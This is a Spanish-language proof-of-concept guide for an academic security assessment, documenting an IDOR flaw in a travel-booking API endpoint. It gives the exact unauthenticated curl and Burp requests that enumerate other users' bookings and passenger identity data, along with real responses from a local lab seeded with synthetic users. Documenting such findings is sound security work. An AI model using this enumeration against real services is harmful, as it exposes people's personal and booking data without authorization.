# Guía de Prueba de Concepto: PoC-01 — Insecure Direct Object References (IDOR / BOLA) en Consulta de Reservas

**Vulnerabilidad:** H-03 — Fuga Masiva de Información Personal e IDOR en `/api/obtener_reservas`  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-284  
**OWASP Top 10:2021:** A01:2021 - Broken Access Control  
**Severidad:** Crítica  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
El endpoint `GET /api/obtener_reservas` está declarado en `SecurityConfig.java:152` como `permitAll()`. El controlador adaptador `ObtenerReservasHandler.java` lee el parámetro de consulta `idUsuario` o `correo`. Si el cliente envía dicho parámetro, el código ignora si el usuario está autenticado y no comprueba si el `idUsuario` consultado pertenece a quien realiza la petición. Como resultado, un atacante puede extraer el historial completo de reservas, datos personales (PII) de los pasajeros (nombres, DNI, teléfono) y datos financieros de pago (tipo de tarjeta, últimos dígitos) de cualquier usuario de la plataforma simplemente variando el identificador numérico.

---

## 2. Precondiciones
1. Contenedores Docker locales levantados y saludables (`travelink-db` y `travelink-app`).
2. Base de datos inicializada con el seed sintético (`sql/seed_pruebas.sql`):
   - Usuario `turista_a@test.local` (`idUsuario = 100`), titular de la Reserva `#500`.
   - Usuario `turista_b@test.local` (`idUsuario = 101`), titular de la Reserva `#501`.

---

## 3. Procedimiento de Ejecución Manual (Request Exacta)

### Opción A: Ejecución mediante `curl` en Terminal (Sin autenticación)
Ejecutar la siguiente petición HTTP sin enviar cookies ni cabeceras de autorización contra el usuario `turista_a` (`idUsuario = 100`):

```bash
curl -i -s -X GET "http://127.0.0.1:8080/api/obtener_reservas?idUsuario=100" \
     -H "Accept: application/json"
```

### Opción B: Petición HTTP cruda para Burp Suite Repeater / ZAP Request Editor
```http
GET /api/obtener_reservas?idUsuario=100 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Connection: close

```

---

## 4. Respuesta Esperada (Comportamiento Vulnerable)
- **Código de Estado HTTP:** `200 OK`
- **Cabeceras:** `Content-Type: application/json;charset=UTF-8`
- **Cuerpo de Respuesta (JSON):**
  La respuesta debe incluir los datos reales del seed (ver `sql/seed_pruebas.sql`):
  - Reserva `#500` con código `"TRV-A100-TEST"`.
  - Pasajero titular con `nroDocumento: "10000001"`, nombre `"Turista"`, apellido `"Alfa"`.
  - Tarjeta terminada en `1111` (o método de pago registrado en el seed).
  - Costo total de `500.00` y datos del tour `"Tour Sintético Machu Picchu Mágico"`.

```json
{
  "status": "success",
  "reservas": [
    {
      "id": 500,
      "codigo": "TRV-A100-TEST",
      "titulo": "Tour Sintético Machu Picchu Mágico",
      "total": 500.0,
      "metodoPago": "Tarjeta",
      "pasajeros": [
        {
          "idPasajero": 500,
          "nroDocumento": "10000001",
          "nombre": "Turista",
          "apellidoPaterno": "Alfa",
          "esTitular": true
        }
      ]
    }
  ]
}
```

---

## 5. Qué Capturar para el Informe Académico
1. **Terminal / Burp Suite Repeater:** Captura de pantalla de la petición `GET /api/obtener_reservas?idUsuario=100` sin cookie de sesión devolviendo `HTTP 200 OK` con los datos de pasajeros (`nroDocumento: 10000001`) y reserva `#500`.
2. **Prueba Cruzada:** Captura repitiendo la petición con `?idUsuario=101` y comprobando que devuelve la reserva de Turista B (`TRV-B101-TEST`, pasajero con `nroDocumento: 10000002`).
3. **Evidencia DBeaver:** Consulta `SELECT idReserva, idUsuario, codigoReserva FROM Reserva WHERE idUsuario IN (100, 101);` para contrastar que los datos extraídos coinciden con la base de datos sin haber tenido permisos.

---

## 6. Resultado Real (Completar tras la prueba)
Salidas HTTP reales obtenidas en sesión sin cookies de sesión ni cabecera `Authorization` (`Wed, 11 Nov 2026 12:39:48 GMT` y `12:39:58 GMT`):

### `curl.exe -i -s "http://127.0.0.1:8080/api/obtener_reservas?idUsuario=100"`
```http
HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Set-Cookie: XSRF-TOKEN=64764cda-6907-49fc-bb7f-603619177ae5; Path=/
Access-control-allow-headers: Content-Type, Authorization, X-Requested-With
Access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
Access-control-allow-origin: *
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Content-Length: 922
Date: Wed, 11 Nov 2026 12:39:48 GMT

{"status":"success","reservas":[{"id":500,"codigo":"TRV-A100-TEST","titulo":"Tour SintÃ©tico Machu Picchu MÃ¡gico","ubicacion":"Cusco, Perú","fechas":"26 Nov. 2026 - 08:00","fechaSalida":"2026-11-26","horaSalida":"08:00","personas":"2 personas","cantAdultos":2,"cantNinos":0,"cantBebes":0,"desglose":"2 adultos × S/ 250.00","agencia":"Agencia Demo Tours","estado":"Confirmada","total":500.0,"metodoPago":"Tarjeta","marcaTarjeta":"null","ultimosDigitos":"null","imagen":"../../img/valle.jpg","idTour":100,"idAgencia":10,"calificada":false,"fechaRegistro":"2026-11-11","motivoCancelacion":"null","pasajeros":[{"idPasajero":500,"nroDocumento":"10000001","nombre":"Turista","apellidoPaterno":"Alfa","apellidoMaterno":"Prueba","esTitular":true,"tipo":"ADULTO"},{"idPasajero":501,"nroDocumento":"10000099","nombre":"AcompaÃ±ante","apellidoPaterno":"Alfa","apellidoMaterno":"Prueba","esTitular":false,"tipo":"ADULTO"}]}]}
```

### `curl.exe -i -s "http://127.0.0.1:8080/api/obtener_reservas?idUsuario=101"`
```http
HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Set-Cookie: XSRF-TOKEN=90bd8c2b-5db2-40b4-9cc8-18d144172e27; Path=/
Access-control-allow-headers: Content-Type, Authorization, X-Requested-With
Access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
Access-control-allow-origin: *
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Content-Length: 917
Date: Wed, 11 Nov 2026 12:39:58 GMT

{"status":"success","reservas":[{"id":501,"codigo":"TRV-B101-TEST","titulo":"City Tour Lima Colonial SintÃ©tico","ubicacion":"Cusco, Perú","fechas":"01 Dec. 2026 - 09:00","fechaSalida":"2026-12-01","horaSalida":"09:00","personas":"2 personas","cantAdultos":2,"cantNinos":0,"cantBebes":0,"desglose":"2 adultos × S/ 80.00","agencia":"Agencia Demo Tours","estado":"Confirmada","total":160.0,"metodoPago":"Tarjeta","marcaTarjeta":"null","ultimosDigitos":"null","imagen":"../../img/valle.jpg","idTour":101,"idAgencia":10,"calificada":false,"fechaRegistro":"2026-11-11","motivoCancelacion":"null","pasajeros":[{"idPasajero":502,"nroDocumento":"10000002","nombre":"Turista","apellidoPaterno":"Beta","apellidoMaterno":"Prueba","esTitular":true,"tipo":"ADULTO"},{"idPasajero":503,"nroDocumento":"10000098","nombre":"AcompaÃ±ante","apellidoPaterno":"Beta","apellidoMaterno":"Prueba","esTitular":false,"tipo":"ADULTO"}]}]}
```
